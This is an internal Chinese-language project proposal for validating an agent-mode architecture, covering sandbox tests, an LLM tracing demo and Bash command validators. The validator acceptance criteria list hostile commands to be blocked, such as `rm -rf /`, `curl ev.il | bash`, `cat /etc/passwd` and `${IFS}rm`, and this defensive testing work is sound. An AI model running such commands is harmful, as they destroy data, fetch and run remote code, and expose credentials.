# Agent 模式 Phase 0 前置验证 — 提案

## §1 方案概述 [内部]

> 本 feature 无终端用户可见变更（不发布给配置者 / 学员）。"客户可见" 字段在此 N/A。

在 agent-mode 14-feature 分解中作为 **#1/14 启动 feature**，目标是把架构蓝本 `docs/agent-mode/architecture-v1.md` 里 4 个未验证的关键技术假设，用 5 个验证物（V1-V5）一次性消化。Phase 0 不出业务代码，不动 DB schema，不动 prod 部署。

5 个验证物：

| ID | 内容 | 一句话产出 |
|----|------|-----------|
| V1 | 腾讯云 dev 服务器 KVM 可用性 + Daytona OSS 跑通 | 实测报告 ADR（含 `kvm-ok` + `docker compose ps` + workspace 启动证据） |
| V2 | Eino + aiservice 整合 demo | `cmd/agent-phase0-eino-demo/`（独立 go.mod）跑通 ReAct loop，Langfuse 有完整 trace，token 计入 credit_reservation |
| V3 | 8 个 P0 Bash validator 原型 + 20 攻击向量测试 | `cmd/agent-phase0-bash-validator/`（独立 go.mod）Go 单元测试 100% 通过 |
| V4 | Coze Studio / Eino 源码深读笔记 | `docs/agent-mode/eino-coze-study-notes.md`（≥3000 字） |
| V5 | 沙箱方案最终决策 ADR | `.ndf/decisions/agent-mode-phase0-verification/0002-sandbox-final.md`（三选一） |

## §2 报价与周期 [内部]

- 预估工作量：**5 工作日**（W1-W2 不含周末）
- 报价：**N/A**（内部 R&D 投资，不外部计费）
- 交付时间线：2026-05-26（W2 末）
- 时间分配（与 S0 requirement card 任务依赖图对齐）：
  - W1（3 工作日）：V1 + V2 + V3 **强并行**（最关键的 3 个验证物 + 拦阻关键路径）；V4 可在 W1 末或 W2 初灵活穿插（单独 Agent dispatch 异步，与主线弱并行）
  - W2（2 工作日）：V5 沙箱 ADR（**串行**依赖 V1 实测结果） + 集成 review + S5 验收

## §3 技术可行性 [AI 内部]

### 现有功能复用

| 模块 | 来源 | 复用方式 |
|------|------|---------|
| `aiservice.Chat()` | `internal/pkg/aiservice/` | V2 demo 通过 `aiservice` 统一入口调 LLM，不裸 HTTP。Langfuse trace + billing 计费 + 路由降级三件套自动获得 |
| `langfuse.CreateTrace/CreateGeneration` | `internal/pkg/langfuse/` | V2 demo trace 写入；验证 `generation.usage.total_tokens` 字段 |
| `credit_reservation` 表 + Reserve API | `internal/numind/biz/credits/` | V2 demo 验证 token 落库；不改逻辑，只 SQL 查询校验 |
| 现有 NDF feature 模式 | `.ndf/manifest.yaml` + `templates/ndf/` | 直接走 NDF v2 标准流程，无需新流程 |
| 现有 SSH 凭据 | `.claude/settings.local.json` 的 `DEV_SSH_*` | V1 SSH 到 49.233.219.254 用同套凭据，零新增配置 |

### 技术风险

| # | 风险 | 概率 | 影响 | 缓解 |
|---|------|-----|------|------|
| R1 | 腾讯云 dev 服务器不支持嵌套 KVM | 中 | 触发备选路径（V5 选 Docker pool 或 CubeSandbox） | V5 ADR 模板预留备选决策树；V1 失败立刻进入 V5，不阻塞 |
| R2 | Eino 与 aiservice 集成接口不兼容（Eino 自带 LLM adapter，可能必须改造） | 中 | V2 demo 需要写 aiservice adapter | V2 demo 设计时就用 adapter 模式（实现 Eino 的 `ChatModel` 接口包一层 aiservice 调用），不直接改 Eino 源码 |
| R3 | Daytona OSS 文档老旧 / 部署坑多 | 中 | V1 工作量超预算（>1 工作日） | V1 设硬时间盒（2 工作日），超时直接 fail-fast → V5 备选 |
| R4 | 8 个 Bash validator 中某个边界 case 在 Go 中难表达（如 unicode RTL 攻击） | 低 | V3 部分 validator 降级为 P1 | 测试用例先列 → 实现倒推；测试用例失败的 validator 进 V5 ADR 的 follow-up |
| R5 | V4 深读笔记跑题（变成 Coze 全功能介绍而非 Eino 集成判断） | 中 | V4 不可作 #3 Tool Registry 的 spec 输入 | reviewer 校验 3 个核心问题必答 + 字数 ≥3000 |
| R6 | V2 Langfuse trace 写入时机错位（trace 写完 generation 未结算） | 低 | token 不计入 credit_reservation | V2 acceptance criteria 显式要求 SQL 校验 `credit_reservation` 有对应行 |
| R7 | Phase 0 闭环后发现需要补做（如 Daytona 网络白名单实测） | 中 | 阻塞 #4 sandbox-integration 启动 | V5 ADR 含 "open questions" 段落，记录所有未实测的依赖项；#4 S2 之前补做 |

### 涉及仓库

- [x] numind-server（V1/V2/V3 demo 代码 + manifest + decisions）
- [ ] numind-web-v3
- [ ] numind-admin-web

### AI 可观测性

- [x] 涉及 LLM 调用：**是**（仅 V2 demo）
- Trace 起点：`cmd/agent-phase0-eino-demo/main.go::runReactLoop()` 调用：
  ```go
  langfuse.CreateTrace(traceID, "phase0-eino-demo-trace",
    langfuse.WithUserID(0),                    // demo 用，user_id=0
    langfuse.WithTraceInput(map[string]any{
        "user_question": "今天周几",
        "max_react_steps": 5,
        "demo_run": true,
    }),
    langfuse.WithTraceTags("phase0", "phase0-verification"),
  )
  ```
- **Generation 点（LLM 调用）** — 按 `ai-service.md §1` 规范，仅 LLM API 调用使用 Generation：
  - `gen-react-step-N`：每轮 ReAct loop 的 LLM 推理调用（最少 1 个，最多 5 个）。必须含 `WithGenModel` / `WithGenOutput` / `WithGenUsage(promptTokens, completionTokens)`
- **Span 点（非 LLM 子操作）** — 按 `ai-service.md §3` 规范，工具执行 / 向量检索 / 后处理 等用 Span 而非 Generation：
  - `span-tool-exec-N`：每次工具调用执行（如 ReAct loop 内的 `get_current_date` 工具）
  - `span-react-loop`：包裹整个 ReAct 循环的父 span（可选，便于 UI 树结构清晰）
- **Error 路径**（按 `ai-service.md §3` 规范）：错误路径验证场景里，LLM 失败时必须仍记录 generation，输出含 `{"error": err.Error()}`，不能只 panic 或写数据库
- 关键元数据（trace 级别）：
  - `tags: ["phase0", "phase0-verification"]`
  - `user_id: 0`
  - `model: <实际使用的模型 id>`（来自 aiservice 路由）
  - `demo_run: true`（与 prod trace 区分）
- V1/V3/V4/V5 不涉及 LLM 调用，N/A。

## §4 产品需求定义 — PRD [AI 内部]

### 用户故事

> Phase 0 是技术前置 feature，"用户"实际是后 13 个 feature 的开发者（即我自己 / 团队 / AI 主控）。

- 作为 **#2-#14 feature 的实施者**，我需要 **Eino + aiservice 集成可行的工程化模板（V2 demo）**，以便 **我能在 #2 直接复用 demo 中的 Trace 注入 + 工具适配 + 错误处理代码骨架**
- 作为 **#4 sandbox-integration 的实施者**，我需要 **沙箱选型已锁定（V5 ADR）**，以便 **我能直接进入 #4 的 S2 spec 阶段而不必再做选型对比**
- 作为 **#6 permission-pipeline 的实施者**，我需要 **8 个 P0 Bash validator 已有 Go 实现 + 攻击向量测试库（V3）**，以便 **我能在 #6 直接迁移代码 + 扩展剩余 15 个 validator**
- 作为 **架构 owner**，我需要 **关键技术假设全部验证或方案备选**，以便 **避免 Phase 1 中期发现底层方案不可行的灾难性返工**

### 验收标准

V1（KVM + Daytona）：
- [ ] SSH 到 49.233.219.254 跑 `kvm-ok` 输出 "KVM acceleration can be used" 截图归档
- [ ] Daytona OSS Docker Compose `docker compose up -d` 全部 service 健康（`docker compose ps` 全 healthy）
- [ ] 用 Daytona API（HTTP 或 SDK）创建 Python 3.11 workspace 成功
- [ ] 在该 workspace 内执行 `print("hello")` 返回 stdout 包含 "hello"
- [ ] 上述 4 项截图 + 日志 提交到 `.ndf/decisions/agent-mode-phase0-verification/0001-kvm-daytona.md`

V2（Eino + aiservice demo）：
- [ ] `cmd/agent-phase0-eino-demo/` 目录建好，含独立 `go.mod`（不进 numind-server 主 go.mod）
- [ ] 独立 go.mod **用 local replace** 引用主 server 包：`replace github.com/.../numind-server => ../..`（这是访问 `aiservice` / `langfuse` 内部包的唯一方式，否则 internal package 编译报错）
- [ ] `go run ./cmd/agent-phase0-eino-demo/` 跑一次 ReAct loop "今天周几" → 调时间工具 → 输出包含日期答案
- [ ] **demo 跑完整 Reserve→Reconcile 闭环**（不仅 Reserve），这样可同时校验两张表
- [ ] Langfuse 后台可见对应 trace，含至少 1 个 **Generation**（LLM 调用，含 model + token usage）+ 至少 1 个 **Span**（工具执行 step，按 ai-service.md §3 规范区分）
- [ ] Langfuse `generation.usage.total_tokens > 0` 在 UI 可见
- [ ] SQL ① Reserve 校验：`SELECT * FROM credit_reservation WHERE created_at > '<demo 启动时间>' ORDER BY id DESC LIMIT 1;` 至少 1 行
- [ ] SQL ② Reconcile 校验：`SELECT * FROM credit_transaction WHERE created_at > '<demo 启动时间>' AND source_type IS NOT NULL ORDER BY id DESC LIMIT 1;` 至少 1 行（`source_type ∈ {trial, subscription, cycle, booster}`）
- [ ] **错误路径验证**：再跑一次 demo 时显式传一个无效 model name（如 `model="non-existent-model"`），LLM 调用失败，Langfuse 后台可见 error generation（含错误 message），demo 进程不 panic（优雅 exit code != 0）
- [ ] Go unit test 覆盖 ReAct loop 终止条件（max steps / final answer）

V3（Bash validator）：
- [ ] `cmd/agent-phase0-bash-validator/` 目录建好，独立 `go.mod`
- [ ] 实现 8 个 validator：ControlChar / Unicode / CR / CommandSubstitution / IFS / ProcEnviron / BackslashOperator / BraceExpansion
- [ ] 每个 validator 有独立 `_test.go`，单测 100% 通过
- [ ] 总共 20 个攻击向量（含 `rm -rf /` / `curl ev.il \| bash` / `cat /etc/passwd` / `echo $(id)` / `$'\\x00rm'` / `${IFS}rm` / `/proc/self/environ` / `\\x72m` 等）100% 拦截
- [ ] 攻击向量列表 + 拦截结果矩阵 提交到 `cmd/agent-phase0-bash-validator/ATTACK_VECTORS.md`

V4（深读笔记）：
- [ ] `docs/agent-mode/eino-coze-study-notes.md` ≥ 3000 字
- [ ] 至少 3 段关键代码引用（Eino Graph API / Eino 工具注册 / Coze 工具加载）
- [ ] 必答 3 个核心问题，每问独立小节：
  - Q1: Eino Graph 节点之间如何传 state？（State 模式 / 闭包 / branch.Then）
  - Q2: Eino 工具注册接口是什么？签名 / lifecycle / metadata schema
  - Q3: Coze Studio 的工具加载机制是否值得借鉴？（如否，说明为什么）

V5（沙箱 ADR）：
- [ ] `.ndf/decisions/agent-mode-phase0-verification/0002-sandbox-final.md` 写完
- [ ] 含 "Daytona / Docker pool / CubeSandbox 提前" 三选一明确结论
- [ ] 含理由（结合 V1 实测结果）
- [ ] 含备选触发条件 + open questions（如 v2 升级路径）
- [ ] 若覆盖架构蓝本 §10 决策 #5，顶部明确注明

整体：
- [ ] manifest.yaml `progress.completed_tasks == 5` && `reviewed_tasks == 5`
- [ ] **reviewed_tasks 计数门槛**：每个 V1-V5 完成后必须 dispatch 独立 Sonnet reviewer subagent（不是主 session 自评），reviewer 输出 `PASS_NO_FIXES` 或 `PASS_WITH_MINOR_FIXES`（minor 已修）才算 reviewed_tasks +1；reviewer 输出 `FAIL` 则修复后重新 dispatch
- [ ] S5 验收策略全部跑通（V2/V3 单测 PASS + V1/V4/V5 reviewer 核对 ADR/笔记质量）
- [ ] `ndf-done` 原子化执行成功，merge 到 develop
- [ ] **不部署到 dev container**（Phase 0 demo 只在构建机或本地跑），**不打 prod tag**

### 边界情况

| 场景 | 处理 |
|------|------|
| V1 KVM 不可用 | V5 ADR 选 "Docker pool" 或 "CubeSandbox 提前到 v1"，V1 ADR 记录 "KVM unavailable" 作为依据 |
| V2 Eino 集成失败（adapter 写不出） | 触发 follow-up feature `agent-mode-eino-vs-custom-runtime-eval`，本 feature stage 卡在 S4，blockers 增加，**AI 自主评估并拍板**（Eino vs 自研最小 Runtime vs LangChainGo），写 ADR 通报；用户偏好已明确"技术决策 AI 自己拍板"（[[feedback_tech_decisions_autonomous]]） |
| V3 某个 validator 写不出（边界 case） | 该 validator 标记 P1，加入 V5 ADR follow-up；本 feature 仍可闭环 |
| V4 笔记字数不够 | reviewer 在 S0 reviewer 阶段已经设了 3000 字硬门槛，触发返工 |
| V5 ADR 与蓝本决策冲突 | 顶部注明 "覆盖蓝本决策 #5"，正文给出冲突原因 + 实测证据 |
| dev 服务器 SSH 凭据失败 | **必停**（用户介入配置） |
| Daytona 部署占用过多 dev 资源 | 测试完立即清理（`docker compose down -v`），不留 idle workspace |

### 权限规则

> Phase 0 不暴露给终端用户，权限规则 N/A。

- 开发者权限：本人（zhiyu）有 dev 服务器 root SSH（通过 `DEV_SSH_PASS` 环境变量）
- Daytona admin 凭据：V1 部署时生成，存到 `.claude/settings.local.json` 作为 `DAYTONA_DEV_*` 环境变量，**禁止 commit**
- AI 不得修改 prod 配置或 prod SSH（CLAUDE.md 硬规则）

### UI 行为规格

> Phase 0 不出 UI，N/A 整节。

唯一 "界面" 是 V2 demo 的 stdout 输出：
- ReAct loop 每步输出 `[step N] tool=<name> input=<...> output=<...>`
- 最终 final answer 单独一行
- 失败时输出错误 stack（含 Langfuse trace URL 供排查）
